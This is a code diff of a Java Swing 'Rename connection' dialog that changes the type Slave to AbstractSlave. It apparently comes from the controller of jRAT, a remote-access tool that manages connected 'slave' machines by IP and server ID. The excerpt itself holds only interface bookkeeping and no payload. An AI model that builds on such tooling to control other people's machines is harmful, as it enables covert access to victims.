@@ -14,7 +14,7 @@ import javax.swing.JTextField;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.border.EmptyBorder;
 
-import su.jrat.client.Slave;
+import su.jrat.client.AbstractSlave;
 import su.jrat.client.settings.ServerID;
 import su.jrat.client.utils.Utils;
 
@@ -25,13 +25,13 @@ public class FrameRename extends BaseFrame {
 	private JPanel contentPane;
 	private JTextField txtOldID;
 	private JTextField txtNewID;
-	public Slave slave;
+	public AbstractSlave slave;
 	private JButton btnRename;
 
-	public FrameRename(Slave slave) {
+	public FrameRename(AbstractSlave slave) {
 		super();
 		this.slave = slave;
-		final Slave sl = slave;
+		final AbstractSlave sl = slave;
 		setTitle("Rename connection - " + slave.getIP());
 		setResizable(false);
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRename.class.getResource("/icons/rename.png")));
@@ -57,7 +57,7 @@ public class FrameRename extends BaseFrame {
 			public void actionPerformed(ActionEvent arg0) {
 				ServerID.getGlobal().add(txtNewID.getText(), sl.getServerID(), sl.getRawIP());
 				for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
-					Slave sla = Utils.getSlave(Frame.mainModel.getValueAt(i, 3).toString());
+					AbstractSlave sla = Utils.getSlave(Frame.mainModel.getValueAt(i, 3).toString());
 					if (sla != null && sla.equals(sl)) {
 						Frame.mainModel.setValueAt(txtNewID.getText(), i, 1);
 						break;
